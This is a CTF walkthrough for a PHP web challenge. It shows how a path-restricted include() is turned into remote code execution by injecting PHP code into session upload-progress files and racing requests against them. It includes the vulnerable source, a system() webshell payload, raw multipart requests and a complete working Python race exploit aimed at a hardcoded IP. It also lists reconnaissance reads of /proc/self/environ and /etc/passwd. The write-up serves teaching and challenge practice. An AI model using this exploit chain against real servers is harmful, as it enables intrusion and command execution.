---
title: "I Hate PHP"
description: "CTF WEB challenge"
date: 2026-03-25T18:49:31+02:00
lastmod: 2026-03-25T18:49:31+02:00
tags:
  - CTF
  - walkthrough
  - web
categories:
  - writeup
cover: "covers/privesc-map.svg"
draft: false
---

`I Hate PHP` is a web challenge where the initial bug looks like a limited local file include, but the real goal is to turn that include into remote code execution and then use that RCE to read the flag.

<!--more-->

## challenge code

The application gives us its own source code:

```php
<?php
$file = $_GET['file'] ?? null;
$roots = ['/proc', '/etc', '/tmp', '/var'];

if ($file && str_starts_with($file, 'file://')) {
    $path = parse_url($file, PHP_URL_PATH);
    $real = is_string($path) ? @realpath($path) : false;
    if ($real !== false) {
        foreach ($roots as $root) {
            if ($real === $root || str_starts_with($real, $root . '/')) {
                include($real);
                exit;
            }
        }
    }
}

highlight_file(__FILE__);
```

At first glance, the filter looks restrictive:

- it only accepts `file://`
- it resolves the path with `realpath()`
- it only allows files under `/proc`, `/etc`, `/tmp`, and `/var`

So this is not a trivial `../../../../flag` challenge. The interesting part is the use of `include()` instead of something like `readfile()`.

That means if I can make PHP include a file containing `<?php ... ?>`, I get code execution.

## first step: turn the include into file read

Before thinking about RCE, I wanted to know exactly how the target was running.

Because `/proc` is allowed, I used it to inspect the current PHP worker.

The most useful files were:

- `/proc/self/cmdline`
- `/proc/self/environ`

### `/proc/self/cmdline`

Reading `/proc/self/cmdline` showed the PHP process command line. The important part was that the server was started with:

```text
php -d session.upload_progress.enabled=On -d session.save_path=/var/lib/php/sessions -S 0.0.0.0:8000 -t /var/www/html
```

This immediately gave two critical facts:

- `session.upload_progress.enabled=On`
- `session.save_path=/var/lib/php/sessions`

That was the first real exploit hint.

### `/proc/self/environ`

Reading `/proc/self/environ` showed the environment variables for the same worker. The key value there was:

```text
PHP_CLI_SERVER_WORKERS=4
```

This matters because the target is using the PHP built-in server with four workers. So the server can process multiple requests concurrently.

If this had been single-worker, a race-based exploit would be much less reliable. With four workers, one request can keep an upload alive while another request repeatedly tries to include the session file.

### other files I checked

I also read a few extra files just to understand the environment better:

- `/etc/passwd`
- `/proc/self/status`
- `/proc/self/mounts`

These were useful for confirming that:

- the read primitive was real
- the PHP process was running as `www-data`
- the challenge was inside a container

But the exploit path really came from `cmdline` and `environ`.

## the key idea

The vulnerability is not just "arbitrary file include."

The real issue is:

1. the application allows `include()` on files inside `/var`
2. PHP stores session files inside `/var/lib/php/sessions`
3. upload progress can write attacker-controlled content into those session files

That gives us a path from file include to code execution.

## why `session.upload_progress` is useful

PHP has a feature that tracks multipart upload progress. When it is enabled, and a request includes a field named `PHP_SESSION_UPLOAD_PROGRESS`, PHP stores progress information in the current session.

For a chosen session id like `abc123`, the session file is:

```text
/var/lib/php/sessions/sess_abc123
```

Normally this is harmless bookkeeping. In this challenge it becomes dangerous because the application will happily do:

```php
include("/var/lib/php/sessions/sess_abc123");
```

if we point `file://` at it.

## why the session file can contain PHP code

The important trick is that the upload progress value becomes part of the session data.

If I send this as the progress value:

```php
<?php echo "__OUT__"; system($_GET["x"] ?? "/readflag"); echo "__END__"; ?>
```

the resulting session file will contain that PHP opening tag somewhere in its contents.

In practice it looks roughly like this:

```text
upload_progress_<?php echo "__OUT__"; system($_GET["x"] ?? "/readflag"); echo "__END__"; ?>|a:...
```

The exact serialized data after that is not important. The important part is that `<?php ... ?>` appears in a file that we can force the application to `include()`.

And that is enough.

When PHP includes a file, it parses the file as PHP source code. Any plain text outside PHP tags is treated as output, but once the parser reaches `<?php`, it starts executing code.

So even though the session file is not a `.php` file, and even though it contains extra serialized session data, the embedded PHP payload still executes.

## why this needs a race

There is one catch: upload progress data is temporary.

PHP updates the progress entry while the upload is happening, but once the upload finishes the progress entry is cleaned up. So if I wait too long and then include the session file, I may get an empty file or a cleaned session instead of my payload.

That means the exploit has to do two things at the same time:

- one request starts a large multipart upload and keeps the session file populated
- another request repeatedly includes that session file until the payload executes

This is why `PHP_CLI_SERVER_WORKERS=4` was so important. It confirmed that overlapping requests were possible.

## request flow

The exploit uses two concurrent request streams.

### request 1: the upload request

This request sends:

- a chosen `PHPSESSID`
- a `PHP_SESSION_UPLOAD_PROGRESS` field containing PHP code
- a large file body so the upload takes long enough to race

Conceptually the multipart body looks like this:

```http
POST / HTTP/1.1
Host: 178.62.202.60:8888
Cookie: PHPSESSID=<sid>
Content-Type: multipart/form-data; boundary=----x

------x
Content-Disposition: form-data; name="PHPSESSID"

<sid>
------x
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

<?php echo "__OUT__"; system($_GET["x"] ?? "/readflag"); echo "__END__"; ?>
------x
Content-Disposition: form-data; name="f"; filename="x"
Content-Type: application/octet-stream

AAAAAA....
------x--
```

While this request is still uploading, PHP keeps updating the session file for that session id.

### request 2: the include request

At the same time, another worker is spammed with:

```text
/?file=file:///var/lib/php/sessions/sess_<sid>&x=/readflag
```

Once one of those requests lands while the session file still contains the injected PHP payload, the server executes:

```php
system($_GET["x"] ?? "/readflag");
```

So the command `/readflag` runs and its output is printed back in the HTTP response.

## making the response easy to parse

To know exactly when the race succeeded, I wrapped the command output between two unique markers:

```php
<?php echo "__OUT_<sid>__"; system($_GET["x"] ?? "/readflag"); echo "__END_<sid>__"; ?>
```

This solves two problems:

- the session file may contain extra plain text before or after the PHP payload
- the response may include warning text or other noise

So the solver just looks for:

- `__OUT_<sid>__`
- `__END_<sid>__`

and extracts whatever is between them.

## the solver

I wrote the final solver as a small fixed-target Python script.

It does the following:

1. Generate a fresh session id.
2. Build a multipart upload with a PHP payload inside `PHP_SESSION_UPLOAD_PROGRESS`.
3. Start the upload in one thread.
4. In parallel, start multiple polling threads that repeatedly request:

```text
file:///var/lib/php/sessions/sess_<sid>
```

5. As soon as one response contains both markers, print the command output and exit.

The final solver is:

```python
#!/usr/bin/env python3
import socket, threading, time, urllib.parse, urllib.request
from concurrent.futures import ThreadPoolExecutor

H, P = "178.62.202.60", 8888
B = f"http://{H}:{P}"

for r in range(30):
    sid = f"s{time.time_ns()}"
    a, z = f"__{sid}A__".encode(), f"__{sid}Z__".encode()
    p = f'<?php echo "{a.decode()}";system($_GET["x"]??"/readflag");echo "{z.decode()}";?>'
    b = "----x"
    body = (
        f'--{b}\r\nContent-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
        f'--{b}\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n{p}\r\n'
        f'--{b}\r\nContent-Disposition: form-data; name="f"; filename="x"\r\nContent-Type: application/octet-stream\r\n\r\n'
    ).encode() + b"A" * (6 * 1024 * 1024) + b"\r\n" + f"--{b}--\r\n".encode()
    head = (
        f"POST / HTTP/1.1\r\nHost: {H}:{P}\r\nCookie: PHPSESSID={sid}\r\n"
        f"Content-Type: multipart/form-data; boundary={b}\r\nContent-Length: {len(body)}\r\n"
        "Connection: close\r\n\r\n"
    ).encode()
    url = f"{B}/?file=" + urllib.parse.quote(f"file:///var/lib/php/sessions/sess_{sid}", safe="") + "&x=/readflag"
    stop, out = threading.Event(), [b""]

    def up():
        s = socket.create_connection((H, P), timeout=8)
        s.sendall(head)
        for i in range(0, len(body), 16384):
            if stop.is_set():
                break
            s.sendall(body[i : i + 16384])
        try:
            while s.recv(4096):
                pass
        except Exception:
            pass
        s.close()
        stop.set()

    def poll():
        while not stop.is_set():
            try:
                d = urllib.request.urlopen(
                    urllib.request.Request(url, headers={"Connection": "close"}),
                    timeout=8,
                ).read()
            except Exception:
                continue
            if a in d and z in d:
                out[0] = d
                stop.set()

    threading.Thread(target=up, daemon=True).start()
    with ThreadPoolExecutor(max_workers=24) as ex:
        for _ in range(24):
            ex.submit(poll)
    if out[0]:
        print(out[0].split(a, 1)[1].split(z, 1)[0].decode("utf-8", "replace").strip())
        raise SystemExit
    print(f"[{r + 1}/30] miss")

raise SystemExit("failed")
```

## running the exploit

Because the target URL and the command are already hardcoded in the solver, running it is just:

```bash
python3 solvephp.py
```

On a successful run it returned:

```text
CATF{7H3_M057_7H1NG_1_H473_4B0U7_PHP_15_H0W_UNPR3D1C74BL3_17_C4N_B3}
```

## full exploit chain

So the final chain is:

1. Use the LFI to read `/proc/self/cmdline`.
2. Learn that upload progress is enabled and sessions are stored in `/var/lib/php/sessions`.
3. Use the LFI to read `/proc/self/environ`.
4. Learn that the PHP built-in server runs with `4` workers, which makes concurrent requests possible.
5. Start a large multipart upload with a controlled session id.
6. Inject `<?php ... ?>` into `PHP_SESSION_UPLOAD_PROGRESS`.
7. Race repeated requests that include `/var/lib/php/sessions/sess_<sid>`.
8. Win the race while the session file still contains the payload.
9. Execute `/readflag`.
10. Read the flag from the response.

## files I read

### remote files

- `/proc/self/cmdline`
- `/proc/self/environ`
- `/etc/passwd`
- `/proc/self/status`
- `/proc/self/mounts`

### local files in the workspace

- `index.php`
- `solvephp.py`
- `probe_progress.py`
- `spray_race.py`
- `twofile_tmp_leak.py`
- `sess/sess_localsid1`

## final note

The nice part of this challenge is that the bug is not a classic unsafe upload. The application never gives us a normal file upload feature.

Instead, the exploit comes from combining:

- a file include primitive
- PHP runtime behavior
- a writable session file under an allowed include path
- a race condition

That is exactly the kind of bug chain PHP challenges love to hide. A constrained LFI often looks weak at first, but if it can reach `/proc`, `/tmp`, logs, or session storage, it is often only one clever pivot away from RCE.